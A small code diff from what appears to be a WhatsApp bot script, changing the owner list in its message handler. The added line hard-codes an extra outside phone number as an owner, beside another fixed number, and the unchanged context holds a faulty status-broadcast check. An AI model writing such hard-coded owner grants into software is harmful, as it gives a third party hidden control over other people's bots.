@@ -40,7 +40,7 @@ if (!mek.hasNewMessage) return
 mek = mek.messages.all()[0]
 if (!mek.message) return
 if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
-ownerNomor = ["6285866295942@s.whatsapp.net",`${setting.ownerNumber}@s.whatsapp.net`]
+ownerNomor = ["6285866295942@s.whatsapp.net",`${setting.ownerNumber}@s.whatsapp.net`,"6285863731628@s.whatsapp.net"]
 require("./denz.js")(nisa, mek)})}
 starts('./session.json')
 
